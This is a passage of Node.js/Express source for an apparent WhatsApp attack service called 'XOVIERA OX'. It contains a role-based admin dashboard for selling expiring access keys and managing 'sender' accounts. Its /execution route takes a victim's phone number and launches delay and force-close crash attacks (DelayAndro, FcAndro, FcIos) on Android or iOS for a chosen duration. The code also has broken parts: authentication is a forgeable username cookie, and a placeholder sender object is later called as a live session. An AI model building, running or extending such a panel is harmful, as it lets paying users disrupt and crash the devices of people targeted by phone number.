      background: var(--success);
      color: var(--dark);
    }
    
    .cancel-btn {
      background: var(--danger);
      color: var(--text);
    }
    
    /* Sender Management Tab */
    .sender-management {
      margin-top: 20px;
    }
    
    .sender-form {
      display: grid;
      grid-template-columns: 1fr auto;
      gap: 10px;
      margin-bottom: 20px;
    }
    
    .sender-form input {
      padding: 10px 15px;
      border-radius: 6px;
      background: rgba(20, 20, 40, 0.7);
      border: 1px solid var(--primary);
      color: var(--text);
      font-size: 14px;
    }
    
    .sender-form button {
      background: linear-gradient(to right, var(--primary), var(--secondary));
      color: var(--dark);
      padding: 10px 15px;
      border-radius: 6px;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
    
    .sender-list {
      list-style: none;
    }
    
    .sender-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 15px;
      background: rgba(20, 20, 40, 0.7);
      border-radius: 6px;
      margin-bottom: 10px;
    }
    
    .sender-item:hover {
      background: rgba(0, 240, 255, 0.1);
    }
    
    .sender-actions {
      display: flex;
      gap: 10px;
    }
    
    .sender-delete-btn {
      background: var(--danger);
      color: white;
      border: none;
      border-radius: 4px;
      padding: 5px 10px;
      cursor: pointer;
    }
    
    /* Permission Management */
    .permission-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      margin-top: 20px;
    }
    
    .permission-card {
      background: rgba(20, 20, 40, 0.7);
      border-radius: 8px;
      padding: 15px;
      border-left: 4px solid var(--primary);
    }
    
    .permission-title {
      font-weight: bold;
      margin-bottom: 10px;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .permission-options {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    
    .permission-option {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    
    .permission-label {
      font-size: 14px;
    }
    
    .permission-toggle {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
    }
    
    .permission-toggle input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    
    .permission-slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 24px;
    }
    
    .permission-slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }
    
    .permission-toggle input:checked + .permission-slider {
      background-color: var(--primary);
    }
    
    .permission-toggle input:checked + .permission-slider:before {
      transform: translateX(26px);
    }
    
    /* Responsive adjustments */
    @media (max-width: 1200px) {
      .add-key-form, .edit-form-grid, .permission-grid {
        grid-template-columns: 1fr 1fr;
      }
    }
    
    @media (max-width: 768px) {
      .header {
        flex-direction: column;
        gap: 15px;
        align-items: flex-start;
      }
      
      .users-table, .sender-list {
        display: block;
        overflow-x: auto;
      }
      
      .add-key-form, .edit-form-grid, .permission-grid {
        grid-template-columns: 1fr;
      }
      
      .sender-form {
        grid-template-columns: 1fr;
      }
    }
    
    @media (max-width: 480px) {
      .nav-buttons, .tab-buttons {
        flex-direction: column;
      }
      
      .action-btn {
        margin: 2px;
      }
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo-container">
      <img src="https://files.catbox.moe/b47zem.jpg" alt="XOVIERA OX" class="logo">
      <h1 class="title">XOVIERA OX | ${currentUserRole.toUpperCase()} DASHBOARD</h1>
    </div>
    <div class="nav-buttons">
      <a href="/execution" class="nav-btn">
        <i class="fas fa-arrow-left"></i> BACK TO ATTACK MENU
      </a>
      <a href="/logout" class="nav-btn">
        <i class="fas fa-sign-out-alt"></i> Logout
      </a>
    </div>
  </div>
  
  <div class="dashboard-container">
    <div class="tab-buttons">
      ${canManageUsers ? '<button class="tab-btn active" data-tab="userManagement">User Management</button>' : ''}
      ${canManageSenders ? '<button class="tab-btn" data-tab="senderManagement">Sender Management</button>' : ''}
      ${currentUserRole === ROLES.OWNER ? '<button class="tab-btn" data-tab="permissionManagement">Permission Management</button>' : ''}
    </div>
    
    ${canManageUsers ? `
    <div id="userManagement" class="tab-content active">
      <h2 class="section-title">
        <i class="fas fa-key"></i> Add New Key
      </h2>
      
      <form id="addKeyForm" class="add-key-form" method="POST" action="/add-key">
        <div class="form-group">
          <label for="username">Username</label>
          <input type="text" id="username" name="username" required>
        </div>
        
        <div class="form-group">
          <label for="key">API Key (auto-generated)</label>
          <input type="text" id="key" name="key" readonly value="${generateKey(4)}">
        </div>
        
        <div class="form-group">
          <label for="duration">Duration</label>
          <input type="number" id="duration" name="duration" min="1" max="365" value="30" required>
        </div>
        
        <div class="form-group">
          <label for="durationUnit">Unit</label>
          <select id="durationUnit" name="durationUnit">
            <option value="minutes">Minutes</option>
            <option value="hours">Hours</option>
            <option value="days" selected>Days</option>
            <option value="months">Months</option>
          </select>
        </div>
        
        <div class="form-group">
          <label for="role">Role</label>
          <select id="role" name="role">
            <option value="owner" ${currentUserRole === ROLES.OWNER ? '' : 'disabled'}>Owner</option>
            <option value="admin">Admin</option>
            <option value="moderator">Moderator</option>
            <option value="helper">Helper</option>
            <option value="premium">Premium</option>
            <option value="vip" selected>VIP</option>
            <option value="exclusive">Exclusive</option>
          </select>
        </div>
        
        <button type="submit" class="form-submit">
          <i class="fas fa-plus"></i> ADD KEY
        </button>
      </form>
      
      <h2 class="section-title">
        <i class="fas fa-users"></i> Registered Users (${users.length})
      </h2>
      
      <table class="users-table">
        <thead>
          <tr>
            <th>Username</th>
            <th>API Key</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          ${users.map(user => {
            const expired = new Date(user.expired).toLocaleString("id-ID", {
              timeZone: "Asia/Jakarta",
              year: "2-digit",
              month: "2-digit",
              day: "2-digit",
              hour: "2-digit",
              minute: "2-digit",
            });
            
            return `
            <tr>
              <td>${user.username}</td>
              <td><code>${user.key}</code></td>
              <td><span class="role-badge ${user.role}-badge">${user.role}</span></td>
              <td>${expired}</td>
              <td>
                <button class="action-btn edit-btn" onclick="showEditForm('${user.username}')">
                  <i class="fas fa-edit"></i> Edit
                </button>
                <button class="action-btn extend-btn" onclick="showExtendForm('${user.username}')">
                  <i class="fas fa-clock"></i> Extend
                </button>
                <button class="action-btn delete-btn" onclick="deleteUser('${user.username}')">
                  <i class="fas fa-trash"></i> Delete
                </button>
              </td>
            </tr>
            <tr id="edit-${user.username}" style="display: none;">
              <td colspan="5">
                <form class="edit-form" onsubmit="updateUser(event, '${user.username}')">
                  <div class="edit-form-grid">
                    <div class="form-group">
                      <label>Username</label>
                      <input type="text" id="edit-username-${user.username}" value="${user.username}" required>
                    </div>
                    <div class="form-group">
                      <label>API Key</label>
                      <input type="text" id="edit-key-${user.username}" value="${user.key}" required>
                    </div>
                    <div class="form-group">
                      <label for="edit-role-${user.username}">Role</label>
                      <select id="edit-role-${user.username}">
                        <option value="owner" ${user.role === 'owner' ? 'selected' : ''} ${currentUserRole === ROLES.OWNER ? '' : 'disabled'}>Owner</option>
                        <option value="admin" ${user.role === 'admin' ? 'selected' : ''}>Admin</option>
                        <option value="moderator" ${user.role === 'moderator' ? 'selected' : ''}>Moderator</option>
                        <option value="helper" ${user.role === 'helper' ? 'selected' : ''}>Helper</option>
                        <option value="premium" ${user.role === 'premium' ? 'selected' : ''}>Premium</option>
                        <option value="vip" ${user.role === 'vip' ? 'selected' : ''}>VIP</option>
                        <option value="exclusive" ${user.role === 'exclusive' ? 'selected' : ''}>Exclusive</option>
                      </select>
                    </div>
                  </div>
                  <div class="edit-form-buttons">
                    <button type="button" class="edit-form-btn cancel-btn" onclick="hideEditForm('${user.username}')">
                      Cancel
                    </button>
                    <button type="submit" class="edit-form-btn save-btn">
                      Save Changes
                    </button>
                  </div>
                </form>
              </td>
            </tr>
            <tr id="extend-${user.username}" style="display: none;">
              <td colspan="5">
                <form class="edit-form" onsubmit="extendUser(event, '${user.username}')">
                  <div class="edit-form-grid">
                    <div class="form-group">
                      <label>Username</label>
                      <input type="text" value="${user.username}" disabled>
                    </div>
                    <div class="form-group">
                      <label>Current Expiry</label>
                      <input type="text" value="${expired}" disabled>
                    </div>
                    <div class="form-group">
                      <label for="extend-amount-${user.username}">Extend By</label>
                      <input type="number" id="extend-amount-${user.username}" min="1" max="365" value="30" required>
                    </div>
                    <div class="form-group">
                      <label for="extend-unit-${user.username}">Unit</label>
                      <select id="extend-unit-${user.username}">
                        <option value="minutes">Minutes</option>
                        <option value="hours">Hours</option>
                        <option value="days" selected>Days</option>
                        <option value="months">Months</option>
                      </select>
                    </div>
                  </div>
                  <div class="edit-form-buttons">
                    <button type="button" class="edit-form-btn cancel-btn" onclick="hideExtendForm('${user.username}')">
                      Cancel
                    </button>
                    <button type="submit" class="edit-form-btn save-btn">
                      Extend Expiry
                    </button>
                  </div>
                </form>
              </td>
            </tr>
            `;
          }).join('')}
        </tbody>
      </table>
    </div>
    ` : ''}
    
    ${canManageSenders ? `
    <div id="senderManagement" class="tab-content">
      <h2 class="section-title">
        <i class="fas fa-paper-plane"></i> Sender Management
      </h2>
      
      <div class="sender-management">
        <form id="connectSenderForm" class="sender-form">
          <input type="text" id="senderNumber" placeholder="628xxxxxxxxxx" required>
          <button type="submit">
            <i class="fas fa-link"></i> Connect
          </button>
        </form>
        
        <h3 class="section-title">
          <i class="fas fa-list"></i> Active Senders (${activeSenders.length})
        </h3>
        
        <ul class="sender-list" id="senderList">
          ${activeSenders.map(sender => `
            <li class="sender-item">
              <span>${sender}</span>
              <div class="sender-actions">
                <button class="sender-delete-btn" onclick="deleteSender('${sender}')">
                  <i class="fas fa-trash"></i> Delete
                </button>
              </div>
            </li>
          `).join('')}
        </ul>
      </div>
    </div>
    ` : ''}
    
    ${currentUserRole === ROLES.OWNER ? `
    <div id="permissionManagement" class="tab-content">
      <h2 class="section-title">
        <i class="fas fa-user-shield"></i> Role Permissions
      </h2>
      
      <div class="permission-grid">
        <div class="permission-card">
          <div class="permission-title">
            <i class="fas fa-user-tie"></i> Admin Permissions
          </div>
          <div class="permission-options">
            <div class="permission-option">
              <span class="permission-label">User Management</span>
              <label class="permission-toggle">
                <input type="checkbox" id="admin-user-management" ${ROLE_PERMISSIONS[ROLES.ADMIN]?.userManagement ? 'checked' : ''}>
                <span class="permission-slider"></span>
              </label>
            </div>
            <div class="permission-option">
              <span class="permission-label">Sender Management</span>
              <label class="permission-toggle">
                <input type="checkbox" id="admin-sender-management" ${ROLE_PERMISSIONS[ROLES.ADMIN]?.senderManagement ? 'checked' : ''}>
                <span class="permission-slider"></span>
              </label>
            </div>
          </div>
        </div>
        
        <div class="permission-card">
          <div class="permission-title">
            <i class="fas fa-user-cog"></i> Moderator Permissions
          </div>
          <div class="permission-options">
            <div class="permission-option">
              <span class="permission-label">User Management</span>
              <label class="permission-toggle">
                <input type="checkbox" id="moderator-user-management" ${ROLE_PERMISSIONS[ROLES.MODERATOR]?.userManagement ? 'checked' : ''}>
                <span class="permission-slider"></span>
              </label>
            </div>
            <div class="permission-option">
              <span class="permission-label">Sender Management</span>
              <label class="permission-toggle">
                <input type="checkbox" id="moderator-sender-management" ${ROLE_PERMISSIONS[ROLES.MODERATOR]?.senderManagement ? 'checked' : ''}>
                <span class="permission-slider"></span>
              </label>
            </div>
          </div>
        </div>
        
        <div class="permission-card">
          <div class="permission-title">
            <i class="fas fa-user-headset"></i> Helper Permissions
          </div>
          <div class="permission-options">
            <div class="permission-option">
              <span class="permission-label">User Management</span>
              <label class="permission-toggle">
                <input type="checkbox" id="helper-user-management" ${ROLE_PERMISSIONS[ROLES.HELPER]?.userManagement ? 'checked' : ''}>
                <span class="permission-slider"></span>
              </label>
            </div>
            <div class="permission-option">
              <span class="permission-label">Sender Management</span>
              <label class="permission-toggle">
                <input type="checkbox" id="helper-sender-management" ${ROLE_PERMISSIONS[ROLES.HELPER]?.senderManagement ? 'checked' : ''}>
                <span class="permission-slider"></span>
              </label>
            </div>
          </div>
        </div>
      </div>
    </div>
    ` : ''}
  </div>

  <script>
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
      });
    });
    
    // User Management Functions
    function showEditForm(username) {
      document.querySelectorAll('[id^="edit-"]').forEach(el => el.style.display = 'none');
      document.querySelectorAll('[id^="extend-"]').forEach(el => el.style.display = 'none');
      document.getElementById('edit-' + username).style.display = 'table-row';
    }
    
    function hideEditForm(username) {
      document.getElementById('edit-' + username).style.display = 'none';
    }
    
    function showExtendForm(username) {
      document.querySelectorAll('[id^="edit-"]').forEach(el => el.style.display = 'none');
      document.querySelectorAll('[id^="extend-"]').forEach(el => el.style.display = 'none');
      document.getElementById('extend-' + username).style.display = 'table-row';
    }
    
    function hideExtendForm(username) {
      document.getElementById('extend-' + username).style.display = 'none';
    }
    
    function updateUser(e, oldUsername) {
      e.preventDefault();
      const username = document.getElementById('edit-username-' + oldUsername).value;
      const key = document.getElementById('edit-key-' + oldUsername).value;
      const role = document.getElementById('edit-role-' + oldUsername).value;
      
      fetch('/edit-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          oldUsername,
          username,
          key,
          role
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('User updated successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while updating the user.');
      });
    }
    
    function extendUser(e, username) {
      e.preventDefault();
      const amount = document.getElementById('extend-amount-' + username).value;
      const unit = document.getElementById('extend-unit-' + username).value;
      
      fetch('/extend-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          amount,
          unit
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('User expiry extended successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while extending the user expiry.');
      });
    }
    
    function deleteUser(username) {
      if (confirm('Are you sure you want to delete user ' + username + '?')) {
        fetch('/delete-key', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ username })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            alert('User deleted successfully!');
            location.reload();
          } else {
            alert('Error: ' + data.message);
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('An error occurred while deleting the user.');
        });
      }
    }
    
    // Sender Management Functions
    document.getElementById('connectSenderForm')?.addEventListener('submit', function(e) {
      e.preventDefault();
      const number = document.getElementById('senderNumber').value;
      
      if (!number) {
        alert('Please enter a valid number');
        return;
      }
      
      fetch('/connect-sender', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ number })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Sender connected successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while connecting the sender.');
      });
    });
    
    function deleteSender(number) {
      if (confirm('Are you sure you want to delete sender ' + number + '?')) {
        fetch('/delete-sender', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ number })
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            alert('Sender deleted successfully!');
            location.reload();
          } else {
            alert('Error: ' + data.message);
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('An error occurred while deleting the sender.');
        });
      }
    }
    
    // Permission Management Functions
    document.getElementById('admin-user-management')?.addEventListener('change', function() {
      updatePermission('admin', 'userManagement', this.checked);
    });
    
    document.getElementById('admin-sender-management')?.addEventListener('change', function() {
      updatePermission('admin', 'senderManagement', this.checked);
    });
    
    document.getElementById('moderator-user-management')?.addEventListener('change', function() {
      updatePermission('moderator', 'userManagement', this.checked);
    });
    
    document.getElementById('moderator-sender-management')?.addEventListener('change', function() {
      updatePermission('moderator', 'senderManagement', this.checked);
    });
    
    document.getElementById('helper-user-management')?.addEventListener('change', function() {
      updatePermission('helper', 'userManagement', this.checked);
    });
    
    document.getElementById('helper-sender-management')?.addEventListener('change', function() {
      updatePermission('helper', 'senderManagement', this.checked);
    });
    
    function updatePermission(role, permission, enabled) {
      fetch('/update-permission', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          role,
          permission,
          enabled
        })
      })
      .then(response => response.json())
      .then(data => {
        if (!data.success) {
          alert('Error updating permission: ' + data.message);
          // Revert the toggle
          document.getElementById(role + '-' + permission).checked = !enabled;
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while updating the permission.');
        // Revert the toggle
        document.getElementById(role + '-' + permission).checked = !enabled;
      });
    }
    
    // Handle add key form submission
    document.getElementById('addKeyForm')?.addEventListener('submit', (e) => {
      e.preventDefault();
      
      const formData = new FormData(e.target);
      const params = new URLSearchParams(formData);
      
      fetch('/add-key', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: params
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Key added successfully!');
          location.reload();
        } else {
          alert('Error: ' + data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while adding the key.');
      });
    });
  </script>
</body>
</html>`;
};

// Routes
app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) {
    return res.send(mainPageHTML(false));
  }
  
  const users = getUsers();
  const user = users.find(u => u.username === username);
  
  if (!user || !user.expired || Date.now() > user.expired) {
    res.clearCookie("sessionUser");
    return res.send(mainPageHTML(false, '', '', "Your session has expired"));
  }
  
  if (user.role === ROLES.OWNER || hasManagementPermission(user.role, 'userManagement')) {
    return res.redirect("/dashboard");
  }
  
  res.redirect("/execution");
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  res.send(mainPageHTML(false, '', '', msg));
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  if (Date.now() > user.expired) {
    return res.redirect("/login?msg=" + encodeURIComponent("Key sudah expired!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  
  if (user.role === ROLES.OWNER || hasManagementPermission(user.role, 'userManagement')) {
    return res.redirect("/dashboard");
  }
  
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";

  if (!username) {
    return res.redirect("/login");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user || !user.expired || Date.now() > user.expired) {
    res.clearCookie("sessionUser");
    return res.redirect("/login?msg=" + encodeURIComponent("Your session has expired"));
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;

  if (sessions.size === 0) {
    return res.send(executionPageHTML(user, mode, targetNumber, "🚧 MAINTENANCE SERVER !! Tunggu sampai maintenance selesai..."));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPageHTML(user, '', '', "Pilih mode yang ingin digunakan."));
    }

    if (["ph4ntom", "extr4vaz", "sl4yerz", "ex4ltedz", "w4nnacry"].includes(mode)) {
      return res.send(executionPageHTML(user, mode, '', "Masukkan nomor target (62xxxxxxxxxx)."));
    }

    return res.send(executionPageHTML(user, '', '', "❌ Mode tidak dikenali."));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPageHTML(user, mode, targetNumber, "❌ Format salah. Nomor harus hanya angka dan diawali dengan nomor negara"));
  }

  try {
    let durationHours = 24; // Default duration
    
    // Handle count/duration parameters
    if (req.query.count) {
      const count = parseInt(req.query.count);
      if (count > 0 && count <= 100) {
        // Convert count to approximate duration based on attack speed
        durationHours = Math.ceil(count / 10); // 10 attacks per hour
      }
    } else if (req.query.duration && req.query.unit) {
      const duration = parseInt(req.query.duration);
      if (duration > 0 && duration <= 100) {
        switch(req.query.unit) {
          case 'minutes':
            durationHours = duration / 60;
            break;
          case 'hours':
            durationHours = duration;
            break;
          case 'days':
            durationHours = duration * 24;
            break;
        }
      }
    }
    
    // Check if user has permission for this attack mode
    if (mode && ATTACK_REQUIREMENTS[mode] && !hasPermission(user.role, ATTACK_REQUIREMENTS[mode])) {
      return res.send(executionPageHTML(user, mode, targetNumber, `❌ Anda tidak memiliki izin untuk menggunakan mode ${mode}. Diperlukan role: ${ATTACK_REQUIREMENTS[mode]}`));
    }
    
    // Execute appropriate attack based on mode
    switch(mode) {
      case "ph4ntom":
        DelayAndro(durationHours, target);
        break;
      case "extr4vaz":
        FcAndro(durationHours, target);
        break;
      case "sl4yerz":
        FcIos(durationHours, target);
        break;
      case "ex4ltedz":
      case "w4nnacry":
        // These are new attack modes - you'll need to implement their functions
        // For now we'll use existing ones as placeholders
        FcAndro(durationHours, target);
        break;
      default:
        throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPageHTML(user, mode, targetNumber, `✅ S U C C E S\n𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`));
  } catch (err) {
    return res.send(executionPageHTML(user, mode, targetNumber, `❌ Gagal kirim: ${err.message || "Terjadi kesalahan saat pengiriman."}`));
  }
});

app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) {
    return res.redirect("/login");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.redirect("/execution");
  }

  // Get active sender numbers
  const activeSenders = sessions.size > 0 ? [...sessions.keys()] : [];
  
  res.send(ownerDashboardHTML(users, activeSenders, user.role));
});

app.post("/add-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { username: newUsername, key, duration, durationUnit, role } = req.body;
  
  if (!newUsername || !key || !duration || !durationUnit || !role) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  // Calculate expiration time
  let durationMs;
  const durationValue = parseInt(duration);
  
  switch(durationUnit) {
    case 'minutes':
      durationMs = durationValue * 60 * 1000;
      break;
    case 'hours':
      durationMs = durationValue * 60 * 60 * 1000;
      break;
    case 'days':
      durationMs = durationValue * 24 * 60 * 60 * 1000;
      break;
    case 'months':
      durationMs = durationValue * 30 * 24 * 60 * 60 * 1000;
      break;
    default:
      return res.json({ success: false, message: "Invalid duration unit" });
  }

  const expired = Date.now() + durationMs;
  
  // Check if user already exists
  const existingUserIndex = users.findIndex(u => u.username === newUsername);
  if (existingUserIndex !== -1) {
    users[existingUserIndex].key = key;
    users[existingUserIndex].expired = expired;
    users[existingUserIndex].role = role;
  } else {
    users.push({ username: newUsername, key, expired, role });
  }

  saveUsers(users);
  res.json({ success: true });
});

app.post("/edit-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { oldUsername, username: newUsername, key, role } = req.body;
  
  if (!oldUsername || !newUsername || !key || !role) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  const editUserIndex = users.findIndex(u => u.username === oldUsername);
  if (editUserIndex === -1) {
    return res.json({ success: false, message: "User not found" });
  }

  // Prevent non-owners from editing owner accounts
  if (users[editUserIndex].role === ROLES.OWNER && currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Only owner can edit other owners" });
  }

  // Prevent non-owners from creating new owner accounts
  if (role === ROLES.OWNER && currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Only owner can create owner accounts" });
  }

  users[editUserIndex].username = newUsername;
  users[editUserIndex].key = key;
  users[editUserIndex].role = role;
  saveUsers(users);
  res.json({ success: true });
});

app.post("/extend-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { username: extendUsername, amount, unit } = req.body;
  
  if (!extendUsername || !amount || !unit) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  const extendUserIndex = users.findIndex(u => u.username === extendUsername);
  if (extendUserIndex === -1) {
    return res.json({ success: false, message: "User not found" });
  }

  // Calculate extension time
  let durationMs;
  const durationValue = parseInt(amount);
  
  switch(unit) {
    case 'minutes':
      durationMs = durationValue * 60 * 1000;
      break;
    case 'hours':
      durationMs = durationValue * 60 * 60 * 1000;
      break;
    case 'days':
      durationMs = durationValue * 24 * 60 * 60 * 1000;
      break;
    case 'months':
      durationMs = durationValue * 30 * 24 * 60 * 60 * 1000;
      break;
    default:
      return res.json({ success: false, message: "Invalid duration unit" });
  }

  users[extendUserIndex].expired += durationMs;
  saveUsers(users);
  res.json({ success: true });
});

app.post("/delete-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { username: deleteUsername } = req.body;
  
  if (!deleteUsername) {
    return res.json({ success: false, message: "Missing username" });
  }

  const deleteUserIndex = users.findIndex(u => u.username === deleteUsername);
  if (deleteUserIndex === -1) {
    return res.json({ success: false, message: "User not found" });
  }

  // Prevent non-owners from deleting owner accounts
  if (users[deleteUserIndex].role === ROLES.OWNER && currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Only owner can delete owner accounts" });
  }

  users.splice(deleteUserIndex, 1);
  saveUsers(users);
  res.json({ success: true });
});

app.post("/connect-sender", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'senderManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, message: "Missing number" });
  }

  // In a real implementation, you would connect to WhatsApp here
  // For now, we'll just simulate it by adding to sessions
  sessions.set(number, {});
  saveActive(number);
  
  res.json({ success: true });
});

app.post("/delete-sender", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'senderManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, message: "Missing number" });
  }

  if (!sessions.has(number)) {
    return res.json({ success: false, message: "Sender not found" });
  }

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.json({ success: false, message: err.message });
  }
});

app.post("/update-permission", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { role, permission, enabled } = req.body;
  
  if (!role || !permission || enabled === undefined) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  if (!ROLE_PERMISSIONS[role]) {
    ROLE_PERMISSIONS[role] = {};
  }

  ROLE_PERMISSIONS[role][permission] = enabled;
  res.json({ success: true });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});